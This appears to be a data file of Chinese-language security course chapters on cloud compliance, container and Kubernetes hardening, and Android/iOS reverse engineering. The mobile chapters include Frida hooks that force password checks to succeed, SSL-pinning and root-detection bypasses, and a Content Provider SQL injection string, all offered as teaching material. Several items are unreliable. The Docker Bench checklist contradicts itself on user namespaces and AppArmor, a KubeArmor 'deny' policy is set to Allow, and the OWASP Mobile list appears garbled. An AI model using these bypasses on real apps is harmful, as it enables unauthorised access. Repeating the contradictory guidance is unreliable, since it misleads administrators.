## 合规框架

**CIS Benchmark**：
\`\`\`bash
# 使用 Prowler 检查 CIS
./prowler -c cis_level1
./prowler -c cis_level2

# 检查项示例
# 1.3 确保 MFA 启用
# 2.1.1 确保 S3 桶不公开
# 3.1 确保 CloudTrail 启用
\`\`\`

**PCI DSS**（支付卡行业）：
- 要求 1：安装和维护防火墙
- 要求 2：不使用供应商默认密码
- 要求 3：保护存储的持卡人数据
- 要求 4：加密传输中的敏感数据
- 要求 6：开发和维护安全系统
- 要求 7：限制对卡数据的访问
- 要求 8：识别和验证访问
- 要求 9：限制对卡数据的物理访问
- 要求 10：跟踪和监控所有访问
- 要求 11：定期测试安全系统
- 要求 12：维护信息安全策略

**HIPAA**（医疗健康）：
- 保护电子健康记录（ePHI）
- 访问控制
- 审计控制
- 完整性控制
- 传输安全

**SOC 2**：
- 安全性
- 可用性
- 处理完整性
- 保密性
- 隐私

## 自动化响应

**EventBridge + Lambda**：
\`\`\`python
# Lambda 函数：自动封禁 IP
import boto3

def lambda_handler(event, context):
    ec2 = boto3.client('ec2')
    ip = event['detail']['sourceIPAddress']
    
    # 更新安全组
    ec2.revoke_security_group_ingress(
        GroupId='sg-12345678',
        IpPermissions=[{
            'IpProtocol': '-1',
            'IpRanges': [{'CidrIp': f'{ip}/32'}]
        }]
    )
    
    return {'statusCode': 200}
\`\`\`

**AWS Config 规则**：
\`\`\`bash
# 创建规则
aws configservice put-config-rule --config-rule '{
  "ConfigRuleName": "s3-bucket-public-read-prohibited",
  "Source": {
    "Owner": "AWS",
    "SourceIdentifier": "S3_BUCKET_PUBLIC_READ_PROHIBITED"
  }
}'
\`\`\`
`}]},{id:12,title:"容器安全",description:"学习 Docker/Kubernetes 安全配置、镜像安全、运行时防护、网络隔离。",status:"published",chapters:[{id:46,course_id:12,title:"第一章：Docker 安全基础",order:1,content:`# Docker 安全基础

## Docker 架构安全

**守护进程安全**：
\`\`\`bash
# 不要暴露 Docker API 到公网
# /etc/docker/daemon.json
{
  "hosts": ["unix:///var/run/docker.sock"],
  "tlsverify": true,
  "tlscacert": "/etc/docker/ca.pem",
  "tlscert": "/etc/docker/server-cert.pem",
  "tlskey": "/etc/docker/server-key.pem"
}
\`\`\`

**用户命名空间**：
\`\`\`bash
# 启用用户命名空间重映射
# /etc/docker/daemon.json
{
  "userns-remap": "default"
}

# 重启 Docker
systemctl restart docker
\`\`\`

## 镜像安全

**镜像扫描**：
\`\`\`bash
# 使用 Trivy 扫描
trivy image nginx:latest

# 使用 Snyk
snyk container test nginx:latest

# 使用 Docker Scout
docker scout cves nginx:latest
\`\`\`

**最小化镜像**：
\`\`\`dockerfile
# 危险：使用完整系统
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3

# 安全：使用 alpine
FROM python:3.11-alpine
COPY app.py /app/
CMD ["python", "/app/app.py"]

# 更安全：使用 distroless
FROM gcr.io/distroless/python3-debian11
COPY app.py /app/
CMD ["/app/app.py"]
\`\`\`

**多阶段构建**：
\`\`\`dockerfile
# 构建阶段
FROM node:18 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# 运行阶段
FROM node:18-alpine
WORKDIR /app
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
CMD ["node", "dist/main.js"]
\`\`\`

**非 root 用户**：
\`\`\`dockerfile
FROM python:3.11-alpine

# 创建非 root 用户
RUN adduser -D -u 1000 appuser
USER appuser

WORKDIR /app
COPY --chown=appuser:appuser . .

CMD ["python", "app.py"]
\`\`\`

## 运行时安全

**只读文件系统**：
\`\`\`bash
docker run --read-only --tmpfs /tmp nginx:latest
\`\`\`

**资源限制**：
\`\`\`bash
docker run \\
  --memory="512m" \\
  --cpus="1.0" \\
  --pids-limit=100 \\
  nginx:latest
\`\`\`

**禁用特权模式**：
\`\`\`bash
# 危险：特权模式
docker run --privileged nginx

# 安全：最小权限
docker run \\
  --cap-drop=ALL \\
  --cap-add=NET_BIND_SERVICE \\
  nginx:latest
\`\`\`

**Seccomp 配置**：
\`\`\`bash
# 使用默认 seccomp 配置
docker run --security-opt seccomp=default.json nginx

# 自定义 seccomp
docker run --security-opt seccomp=custom.json nginx
\`\`\`

**AppArmor**：
\`\`\`bash
# 加载 AppArmor 配置
apparmor_parser -a docker-nginx

# 应用配置
docker run --security-opt apparmor=docker-nginx nginx
\`\`\`
`},{id:47,course_id:12,title:"第二章：Kubernetes 安全",order:2,content:`# Kubernetes 安全

## RBAC（基于角色的访问控制）

**创建角色**：
\`\`\`yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "watch"]
\`\`\`

**绑定角色**：
\`\`\`yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
  namespace: default
subjects:
- kind: User
  name: jane
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
\`\`\`

**集群角色**：
\`\`\`yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: node-reader
rules:
- apiGroups: [""]
  resources: ["nodes"]
  verbs: ["get", "list", "watch"]
\`\`\`

## Pod 安全标准

**Privileged（特权）**：
\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: nginx
    image: nginx
    securityContext:
      privileged: true  # 危险！
\`\`\`

**Baseline（基线）**：
\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: baseline-pod
spec:
  containers:
  - name: nginx
    image: nginx
    securityContext:
      privileged: false
      runAsNonRoot: true
      readOnlyRootFilesystem: true
\`\`\`

**Restricted（受限）**：
\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: restricted-pod
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: nginx
    image: nginx
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop:
        - ALL
      readOnlyRootFilesystem: true
      runAsNonRoot: true
\`\`\`

## 网络策略

**默认拒绝所有**：
\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
\`\`\`

**允许特定流量**：
\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend
  namespace: default
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080
\`\`\`

**限制出站**：
\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-egress
  namespace: default
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: database
    ports:
    - protocol: TCP
      port: 5432
\`\`\`

## Secret 管理

**创建 Secret**：
\`\`\`bash
# 从字面量创建
kubectl create secret generic db-secret \\
  --from-literal=username=admin \\
  --from-literal=password=secret123

# 从文件创建
kubectl create secret generic tls-secret \\
  --from-file=tls.crt=./server.crt \\
  --from-file=tls.key=./server.key

# Base64 编码
echo -n "admin" | base64  # YWRtaW4=
\`\`\`

**使用 Secret**：
\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: secret-pod
spec:
  containers:
  - name: app
    image: myapp
    env:
    - name: DB_USERNAME
      valueFrom:
        secretKeyRef:
          name: db-secret
          key: username
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: db-secret
          key: password
    volumeMounts:
    - name: secret-volume
      mountPath: /etc/secrets
      readOnly: true
  volumes:
  - name: secret-volume
    secret:
      secretName: db-secret
\`\`\`

**加密 Secret**：
\`\`\`yaml
# /etc/kubernetes/manifests/kube-apiserver.yaml
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver
spec:
  containers:
  - name: kube-apiserver
    command:
    - --encryption-provider-config=/etc/kubernetes/encryption-config.yaml
\`\`\`

\`\`\`yaml
# /etc/kubernetes/encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
    - secrets
    providers:
    - aescbc:
        keys:
        - name: key1
          secret: <base64-encoded-key>
    - identity: {}
\`\`\`
`},{id:48,course_id:12,title:"第三章：镜像仓库安全",order:3,content:`# 镜像仓库安全

## 私有仓库

**Harbor 部署**：
\`\`\`bash
# 下载 Harbor
wget https://github.com/goharbor/harbor/releases/download/v2.9.0/harbor-offline-installer-v2.9.0.tgz
tar xvf harbor-offline-installer-v2.9.0.tgz
cd harbor

# 配置
# harbor.yml
hostname: harbor.example.com
https:
  port: 443
  certificate: /path/to/server.crt
  private_key: /path/to/server.key

# 安装
./install.sh
\`\`\`

**访问控制**：
\`\`\`bash
# 创建项目
harbor-cli project create my-project --public false

# 创建用户
harbor-cli user create developer --password secret123

# 分配角色
harbor-cli member add --project my-project --user developer --role developer
\`\`\`

## 镜像签名

**Cosign 签名**：
\`\`\`bash
# 安装 cosign
go install github.com/sigstore/cosign/v2/cmd/cosign@latest

# 生成密钥对
cosign generate-key-pair

# 签名镜像
cosign sign --key cosign.key myregistry.com/myapp:latest

# 验证签名
cosign verify --key cosign.pub myregistry.com/myapp:latest
\`\`\`

**Notary**：
\`\`\`bash
# 初始化仓库
docker trust key generate mykey
docker trust signer add --key mykey.pub mykey myregistry.com/myapp

# 签名镜像
docker trust sign myregistry.com/myapp:latest

# 验证
docker trust inspect myregistry.com/myapp:latest --pretty
\`\`\`

## 漏洞扫描

**Trivy**：
\`\`\`bash
# 安装
brew install aquasecurity/trivy/trivy

# 扫描镜像
trivy image nginx:latest

# 扫描文件系统
trivy fs .

# 扫描配置
trivy config .

# CI/CD 集成
trivy image --exit-code 1 --severity HIGH,CRITICAL nginx:latest
\`\`\`

**Snyk**：
\`\`\`bash
# 安装
npm install -g snyk

# 登录
snyk auth

# 扫描容器
snyk container test myregistry.com/myapp:latest

# 扫描代码
snyk code test

# 监控
snyk monitor --docker myregistry.com/myapp:latest
\`\`\`

**Grype**：
\`\`\`bash
# 安装
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# 扫描镜像
grype nginx:latest

# 扫描目录
grype dir:.

# 输出格式
grype nginx:latest -o json
grype nginx:latest -o table
\`\`\`

## 供应链安全

**SBOM（软件物料清单）**：
\`\`\`bash
# 使用 Syft 生成 SBOM
syft nginx:latest -o spdx-json > sbom.json

# 使用 Trivy 生成
trivy image --format spdx-json -o sbom.json nginx:latest

# 验证 SBOM
grype sbom:sbom.json
\`\`\`

**依赖检查**：
\`\`\`bash
# 检查过时依赖
docker scout recommendations myregistry.com/myapp:latest

# 检查许可证
syft nginx:latest -o json | jq '.artifacts[] | {name, version, licenses}'
\`\`\`

## 运行时防护

**Falco**：
\`\`\`yaml
# falco-rules.yaml
- rule: Terminal shell in container
  desc: A shell was used as the entrypoint/exec point
  condition: >
    spawned_process and container and
    shell_procs and proc.tty != 0
  output: >
    Shell spawned in container
    (user=%user.name container_id=%container.id
    shell=%proc.name parent=%proc.pname)
  priority: WARNING
\`\`\`

\`\`\`bash
# 部署 Falco
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \\
  --set falcosidekick.enabled=true
\`\`\`

**KubeArmor**：
\`\`\`yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: deny-write-etc
  namespace: default
spec:
  selector:
    matchLabels:
      app: myapp
  process:
    matchPaths:
    - path: /bin/bash
  file:
    matchDirectories:
    - dir: /etc/
      recursive: true
  action: Allow
\`\`\`
`},{id:49,course_id:12,title:"第四章：容器安全审计",order:4,content:`# 容器安全审计

## Docker 安全审计

**Docker Bench**：
\`\`\`bash
# 安装
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security

# 运行审计
docker run --rm --net host --pid host --userns host --cap-add audit_write \\
  --privileged -v /etc:/etc:ro -v /var/lib:/var/lib:ro \\
  -v /var/run/docker.sock:/var/run/docker.sock:ro \\
  -v /usr/lib/systemd:/usr/lib/systemd:ro \\
  -v /var/log:/var/log:ro \\
  docker/docker-bench-security
\`\`\`

**常见检查项**：
- 2.1：确保 Docker 守护进程使用用户命名空间
- 2.2：确保禁用默认 AppArmor 配置文件
- 2.3：确保禁用不安全的 seccomp 配置文件
- 2.4：确保 Docker 守护进程不使用用户命名空间
- 2.5：确保禁用远程管理
- 2.6：确保配置日志记录
- 2.7：确保默认不转发
- 2.8：确保禁用用户命名空间
- 2.9：确保启用用户命名空间
- 2.10：确保配置内存限制
- 2.11：确保配置 CPU 限制
- 2.12：确保 /var/lib/docker 有独立分区
- 2.13：确保 /var/lib/docker 挂载节点
- 2.14：确保容器使用 trusted 基础镜像
- 2.15：确保不挂载敏感系统目录
- 2.16：确保容器以非 root 用户运行
- 2.17：确保容器资源受限
- 2.18：确保容器使用只读根文件系统

## Kubernetes 安全审计

**Kube-bench**：
\`\`\`bash
# 安装
go install github.com/aquasecurity/kube-bench@latest

# 运行
kube-bench --version 1.27

# 输出 JSON
kube-bench --json

# 输出 JUnit
kube-bench --junit
\`\`\`

**CIS Benchmark 检查**：
\`\`\`bash
# Master 节点
kube-bench run --targets master

# Node 节点
kube-bench run --targets node

# 控制平面
kube-bench run --targets controlplane

# 策略
kube-bench run --targets policies
\`\`\`

**Polaris**：
\`\`\`bash
# 安装
brew install FairwindsOps/tap/polaris

# 审计集群
polaris audit --kubeconfig ~/.kube/config

# Web 仪表板
polaris dashboard --port 8080

# 输出格式
polaris audit --format json
polaris audit --format html
\`\`\`

## 运行时监控

**Sysdig**：
\`\`\`bash
# 安装
curl -s https://s3.amazonaws.com/download.draios.com/DRAIOS-GPG-KEY.public | apt-key add -
echo "deb http://download.draios.com/stable/deb stable main" > /etc/apt/sources.list.d/draios.list
apt-get update && apt-get install sysdig

# 捕获系统调用
sysdig -c topfiles_bytes

# 查看容器活动
sysdig -c spy_users

# 检测异常
sysdig -c unexpected_connections
\`\`\`

**Tetragon**：
\`\`\`bash
# 安装
helm repo add cilium https://helm.cilium.io
helm install tetragon cilium/tetragon -n kube-system

# 查看事件
kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout

# 创建策略
kubectl apply -f - <<EOF
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: process-exec
spec:
  kprobes:
  - call: "security_bprm_check"
    syscall: false
    args:
    - index: 0
      type: "file"
EOF
\`\`\`

## 安全最佳实践

**镜像安全**：
1. 使用官方基础镜像
2. 定期更新镜像
3. 扫描漏洞
4. 签名验证
5. 最小化镜像

**运行时安全**：
1. 非 root 用户运行
2. 只读根文件系统
3. 删除不必要的工具
4. 限制资源
5. 网络隔离

**供应链安全**：
1. 使用私有仓库
2. 镜像签名
3. SBOM 生成
4. 依赖检查
5. 漏洞扫描

**监控与审计**：
1. 启用审计日志
2. 运行时监控
3. 异常检测
4. 定期审计
5. 告警通知
`}]},{id:13,title:"移动安全",description:"学习 Android/iOS 应用安全分析、逆向工程、漏洞挖掘、安全防护。",status:"published",chapters:[{id:50,course_id:13,title:"第一章：Android 安全基础",order:1,content:`# Android 安全基础

## Android 架构

**四层架构**：
1. **Linux Kernel**：硬件抽象、进程管理、安全
2. **Libraries & Android Runtime**：C/C++ 库、ART 运行时
3. **Application Framework**：Java API 框架
4. **Applications**：系统应用、第三方应用

**安全机制**：
- **应用沙箱**：每个应用独立进程
- **权限模型**：声明式权限控制
- **签名验证**：APK 必须签名
- **SELinux**：强制访问控制

## APK 结构

**解压 APK**：
\`\`\`bash
# 使用 unzip
unzip app.apk -d app_extracted/

# 使用 apktool（反编译资源）
apktool d app.apk -o app_decompiled/

# 使用 jadx（反编译为 Java）
jadx -d app_jadx app.apk
\`\`\`

**关键文件**：
- \`AndroidManifest.xml\`：应用配置、权限声明
- \`classes.dex\`：编译后的字节码
- \`resources.arsc\`：编译后的资源
- \`res/\`：资源文件
- \`lib/\`：原生库
- \`assets/\`：资产文件
- \`META-INF/\`：签名信息

## 权限分析

**AndroidManifest.xml**：
\`\`\`xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.app">
    
    <!-- 危险权限 -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    
    <!-- 自定义权限 -->
    <permission
        android:name="com.example.permission.MY_PERMISSION"
        android:protectionLevel="signature" />
    
    <application
        android:allowBackup="true"  <!-- 危险：允许备份 -->
        android:debuggable="false"  <!-- 调试模式 -->
        android:exported="false">   <!-- 组件导出 -->
        
        <!-- 导出组件 -->
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <!-- Content Provider -->
        <provider
            android:name=".MyProvider"
            android:authorities="com.example.provider"
            android:exported="true"
            android:permission="com.example.permission.READ" />
    </application>
</manifest>
\`\`\`

**权限分类**：
- **Normal**：自动授予（INTERNET）
- **Dangerous**：需要用户确认（CAMERA、LOCATION）
- **Signature**：签名匹配自动授予
- **System**：仅系统应用

## 数据存储安全

**SharedPreferences**：
\`\`\`java
// 不安全：明文存储
SharedPreferences prefs = getSharedPreferences("config", MODE_PRIVATE);
prefs.edit().putString("password", "secret123").apply();

// 文件位置：/data/data/com.example.app/shared_prefs/config.xml
\`\`\`

**SQLite 数据库**：
\`\`\`java
// 不安全：未加密
SQLiteDatabase db = openOrCreateDatabase("app.db", MODE_PRIVATE, null);
db.execSQL("CREATE TABLE users (username TEXT, password TEXT)");
db.execSQL("INSERT INTO users VALUES ('admin', 'password123')");

// 安全：使用 SQLCipher
SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(
    "encrypted.db", "encryption_key", null
);
\`\`\`

**内部存储**：
\`\`\`java
// 不安全：全局可读
FileOutputStream fos = openFileOutput("data.txt", MODE_WORLD_READABLE);
fos.write("sensitive data".getBytes());
fos.close();

// 安全：仅应用可读
FileOutputStream fos = openFileOutput("data.txt", MODE_PRIVATE);
fos.write("sensitive data".getBytes());
fos.close();
\`\`\`

**外部存储**：
\`\`\`java
// 不安全：外部存储可被其他应用访问
File file = new File(Environment.getExternalStorageDirectory(), "data.txt");
FileWriter fw = new FileWriter(file);
fw.write("sensitive data");
fw.close();
\`\`\`
`},{id:51,course_id:13,title:"第二章：Android 逆向工程",order:2,content:`# Android 逆向工程

## 反编译工具

**JADX（Java 反编译）**：
\`\`\`bash
# 安装
brew install jadx

# 反编译 APK
jadx -d output_dir app.apk

# GUI 模式
jadx-gui app.apk

# 命令行搜索
jadx -d output app.apk
grep -r "password" output/
\`\`\`

**APKTool（资源反编译）**：
\`\`\`bash
# 反编译
apktool d app.apk -o output

# 修改资源
vim output/res/values/strings.xml

# 重新打包
apktool b output -o modified.apk

# 签名
apksigner sign --ks my.keystore modified.apk
\`\`\`

**Frida（动态插桩）**：
\`\`\`javascript
// hook.js - Hook Java 方法
Java.perform(function() {
    var MainActivity = Java.use("com.example.app.MainActivity");
    
    MainActivity.checkPassword.implementation = function(password) {
        console.log("[*] checkPassword called with: " + password);
        return true;  // 绕过验证
    };
});
\`\`\`

\`\`\`bash
# 运行 Frida
frida -U -f com.example.app -l hook.js --no-pause
\`\`\`

**Objection（Frida 封装）**：
\`\`\`bash
# 安装
pip install objection

# 连接到应用
objection -g com.example.app explore

# 常用命令
> android hooking list activities
> android hooking watch class com.example.app.MainActivity
> android sslpinning disable
> android root disable
\`\`\`

## 动态分析

**ADB 调试**：
\`\`\`bash
# 连接设备
adb devices

# 安装应用
adb install app.apk

# 启动应用
adb shell am start -n com.example.app/.MainActivity

# 查看日志
adb logcat | grep "example"

# 提取数据
adb pull /data/data/com.example.app/ ./extracted/

# 执行 shell
adb shell
run-as com.example.app
ls -la
\`\`\`

**代理抓包**：
\`\`\`bash
# 设置代理
adb shell settings put global http_proxy 192.168.1.100:8080

# 清除代理
adb shell settings put global http_proxy :0

# Burp Suite 配置
# 1. 启动 Burp，监听 8080
# 2. 安装 Burp CA 证书
# 3. 配置应用信任用户证书
\`\`\`

**SSL 证书固定绕过**：
\`\`\`javascript
// Frida 绕过 OkHttp3 SSL Pinning
Java.perform(function() {
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
        console.log("[*] Bypassing SSL Pinning for: " + hostname);
    };
});
\`\`\`

## 漏洞挖掘

**Intent 嗅探**：
\`\`\`bash
# 列出导出的组件
adb shell dumpsys package com.example.app | grep -A 5 "Activity\\|Service\\|Receiver\\|Provider"

# 启动导出的 Activity
adb shell am start -n com.example.app/.ExportedActivity

# 发送 Intent
adb shell am broadcast -a com.example.app.ACTION -n com.example.app/.MyReceiver
\`\`\`

**Content Provider 注入**：
\`\`\`bash
# 查询 Provider
adb shell content query --uri content://com.example.provider/users

# SQL 注入测试
adb shell content query --uri content://com.example.provider/users --projection "* FROM users--"
\`\`\`

**WebView 漏洞**：
\`\`\`java
// 不安全的 WebView 配置
WebView webView = findViewById(R.id.webview);
WebSettings settings = webView.getSettings();
settings.setJavaScriptEnabled(true);
settings.setAllowFileAccess(true);
settings.setAllowUniversalAccessFromFileURLs(true);  // 危险

// 安全的配置
settings.setAllowFileAccess(false);
settings.setAllowUniversalAccessFromFileURLs(false);
settings.setAllowContentAccess(false);
\`\`\`

## 加固与防护

**代码混淆**：
\`\`\`gradle
// build.gradle
android {
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}
\`\`\`

\`\`\`proguard
# proguard-rules.pro
-keep class com.example.app.PublicAPI { *; }
-keepclassmembers class * {
    @com.example.Keep *;
}
-obfuscationdictionary obfuscation_dict.txt
\`\`\`

**Root 检测**：
\`\`\`java
public boolean isRooted() {
    String[] paths = {
        "/system/app/Superuser.apk",
        "/sbin/su",
        "/system/bin/su",
        "/system/xbin/su"
    };
    for (String path : paths) {
        if (new File(path).exists()) return true;
    }
    return false;
}
\`\`\`

**调试器检测**：
\`\`\`java
public boolean isDebuggable() {
    return (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
}
\`\`\`
`},{id:52,course_id:13,title:"第三章：iOS 安全基础",order:3,content:`# iOS 安全基础

## iOS 架构

**四层架构**：
1. **Cocoa Touch**：应用框架层
2. **Media**：图形、音频、视频
3. **Core Services**：基础服务
4. **Core OS**：底层系统

**安全机制**：
- **沙箱**：每个应用独立沙箱
- **代码签名**：必须 Apple 签名
- **加密**：数据保护 API
- **越狱检测**：检测越狱状态

## IPA 结构

**解压 IPA**：
\`\`\`bash
# IPA 本质是 ZIP
unzip app.ipa -d app_extracted/

# Payload 目录包含 .app
ls Payload/
# MyApp.app/

# 查看 Info.plist
defaults read Payload/MyApp.app/Info.plist

# 查看二进制
file Payload/MyApp.app/MyApp
\`\`\`

**关键文件**：
- \`Info.plist\`：应用配置
- \`MyApp\`：主二进制文件
- \`Frameworks/\`：嵌入框架
- \`PlugIns/\`：插件
- \`_CodeSignature/\`：代码签名

## 越狱设备

**越狱工具**：
- **checkra1n**：基于 checkm8 漏洞
- **unc0ver**：iOS 11-14
- **Taurine**：iOS 14
- **Palera1n**：iOS 15-16

**越狱后工具**：
\`\`\`bash
# SSH 连接
ssh root@192.168.1.100
# 默认密码：alpine

# 安装 OpenSSH
apt-get install openssh

# 安装 Cydia Substrate
# 用于动态插桩
\`\`\`

## 逆向工具

**class-dump（头文件提取）**：
\`\`\`bash
# 提取 Objective-C 头文件
class-dump -H -o headers MyApp.app/MyApp

# 查看特定类
class-dump MyApp.app/MyApp | grep -A 10 "@interface LoginViewController"
\`\`\`

**Hopper（反汇编器）**：
\`\`\`bash
# 打开二进制
hopper -f MyApp.app/MyApp

# 伪代码视图
# 查看 Objective-C 方法
# 分析控制流
\`\`\`

**Frida（动态插桩）**：
\`\`\`javascript
// hook.js - Hook Objective-C 方法
var className = "LoginViewController";
var methodName = "- checkPassword:";

var hook = ObjC.classes[className][methodName];
Interceptor.attach(hook.implementation, {
    onEnter: function(args) {
        console.log("[*] checkPassword called");
        console.log("    Password: " + ObjC.Object(args[2]).toString());
    },
    onLeave: function(retval) {
        console.log("    Return: " + retval);
        retval.replace(1);  // 绕过验证
    }
});
\`\`\`

\`\`\`bash
# 运行
frida -U -f com.example.myapp -l hook.js --no-pause
\`\`\`

**Cycript（交互式调试）**：
\`\`\`bash
# 附加到应用
cycript -p MyApp

# 交互式命令
cy# [UIApplication sharedApplication]
cy# var vc = UIApp.keyWindow.rootViewController
cy# vc.view.backgroundColor = [UIColor redColor]
\`\`\`

## 数据存储

**NSUserDefaults**：
\`\`\`objective-c
// 不安全：明文存储
NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
[defaults setObject:@"password123" forKey:@"user_password"];
[defaults synchronize];

// 文件位置：/var/mobile/Containers/Data/Application/UUID/Library/Preferences/com.example.app.plist
\`\`\`

**Keychain**：
\`\`\`objective-c
// 安全存储
NSDictionary *query = @{
    (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
    (__bridge id)kSecAttrAccount: @"user_password",
    (__bridge id)kSecValueData: [@"password123" dataUsingEncoding:NSUTF8StringEncoding]
};

SecItemAdd((__bridge CFDictionaryRef)query, NULL);
\`\`\`

**Core Data**：
\`\`\`objective-c
// 默认不加密
NSManagedObject *user = [NSEntityDescription insertNewObjectForEntityForName:@"User" inManagedObjectContext:context];
[user setValue:@"password123" forKey:@"password"];
[context save:nil];

// 加密：使用 SQLCipher
\`\`\`

**文件保护**：
\`\`\`objective-c
// 使用数据保护 API
NSData *data = [@"sensitive" dataUsingEncoding:NSUTF8StringEncoding];
[data writeToFile:@"/path/to/file" options:NSDataWritingFileProtectionComplete error:nil];

// 保护级别
// NSDataWritingFileProtectionComplete - 设备锁定时不可访问
// NSDataWritingFileProtectionCompleteUnlessOpen - 打开后可继续访问
// NSDataWritingFileProtectionCompleteUntilFirstUserAuthentication - 首次解锁后可访问
\`\`\`
`},{id:53,course_id:13,title:"第四章：移动安全测试",order:4,content:`# 移动安全测试

## OWASP Mobile Top 10

**2023 榜单**：
1. **M1：不当凭证管理**
2. **M2：不安全的身份验证**
3. **M3：不安全的网络通信**
4. **M4： insufficient 输入验证**
5. **M5：不安全的授权**
6. **M6：不安全的客户端存储**
7. **M7：不安全的代码**
8. **M8：不安全的反序列化**
9. **M9：不足的日志记录**
10. **M10：不安全的第三方库**

## 自动化测试工具

**MobSF（移动安全框架）**：
\`\`\`bash
# Docker 部署
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# 访问
http://localhost:8000

# 上传 APK/IPA 进行静态和动态分析
\`\`\`

**QARK（Quick Android Review Kit）**：
\`\`\`bash
# 安装
git clone https://github.com/linkedin/qark.git
cd qark
pip install -r requirements.txt

# 运行
python qark.py --apk app.apk

# 生成报告
python qark.py --apk app.apk --report html
\`\`\`

**Needle（iOS 安全测试）**：
\`\`\`bash
# 安装
git clone https://github.com/FSecureLABS/needle.git
cd needle
./install.sh

# 运行
needle
[needle] use module storage/data/keychain
[needle] set app com.example.app
[needle] run
\`\`\`

## 网络测试

**代理设置**：
\`\`\`bash
# Android
adb shell settings put global http_proxy 192.168.1.100:8080

# iOS
# 设置 → Wi-Fi → 配置代理 → 手动
# 服务器：192.168.1.100
# 端口：8080
\`\`\`

**SSL 证书固定绕过**：
\`\`\`bash
# Android - Frida
frida -U -f com.example.app -l ssl_bypass.js --no-pause

# iOS - Objection
objection -g com.example.app explore
objection> android sslpinning disable
objection> ios sslpinning disable
\`\`\`

**证书固定检测**：
\`\`\`bash
# 使用 objection 检测
objection -g com.example.app explore
objection> android hooking list classes | grep -i ssl
objection> android hooking search string "CertificatePinner"
\`\`\`

## 漏洞测试清单

**身份验证**：
- [ ] 弱密码策略
- [ ] 无账户锁定
- [ ] 会话管理不当
- [ ] 密码明文传输

**数据存储**：
- [ ] 敏感数据明文存储
- [ ] 日志记录敏感信息
- [ ] 备份包含敏感数据
- [ ] 剪贴板包含敏感数据

**网络通信**：
- [ ] 未使用 HTTPS
- [ ] SSL 证书固定缺失
- [ ] 证书验证不当
- [ ] 敏感数据 URL 参数

**授权**：
- [ ] 越权访问
- [ ] 水平越权
- [ ] 垂直越权
- [ ] 不安全的直接对象引用

**代码质量**：
- [ ] 调试代码残留
- [ ] 硬编码凭证
- [ ] 不安全的随机数
- [ ] 不安全的加密

## 安全加固

**代码混淆**：
\`\`\`gradle
// ProGuard
-optimizationpasses 5
-dontusemixedcaseclassnames
-keepattributes *Annotation*
-keep class com.example.** { *; }
\`\`\`

**Root/越狱检测**：
\`\`\`java
// Android
public boolean isDeviceRooted() {
    return checkRootMethod1() || checkRootMethod2() || checkRootMethod3();
}

private boolean checkRootMethod1() {
    String buildTags = android.os.Build.TAGS;
    return buildTags != null && buildTags.contains("test-keys");
}
\`\`\`

\`\`\`objective-c
// iOS
BOOL isJailbroken() {
    NSArray *paths = @[
        @"/Applications/Cydia.app",
        @"/usr/sbin/sshd",
        @"/usr/bin/ssh"
    ];
    
    for (NSString *path in paths) {
        if ([[NSFileManager defaultManager] fileExistsAtPath:path]) {
            return YES;
        }
    }
    return NO;
}
\`\`\`

